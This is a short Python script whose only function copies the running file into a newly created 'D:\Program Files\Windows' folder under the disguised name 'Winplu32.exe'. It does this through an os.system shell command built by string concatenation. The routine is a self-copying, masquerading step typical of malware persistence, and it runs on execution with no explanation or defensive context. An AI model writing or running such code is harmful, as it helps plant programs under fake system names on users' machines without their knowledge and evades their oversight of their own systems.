# -*- coding: utf-8 -*-
import os
import sys
def copy():
    name = os.path.abspath(__file__)

    name = "\"" + name + "\""
    print(name)
    cpname = "\"D:\\Program Files\\Windows\\Winplu32.exe\""
    cpdir = "D:\\Program Files\\Windows"
    result = os.path.exists(cpdir)
    print(result)
    if not result:
        os.makedirs(cpdir)


    str1 = "copy "+name+" "+cpname
    os.system(str1)
copy()
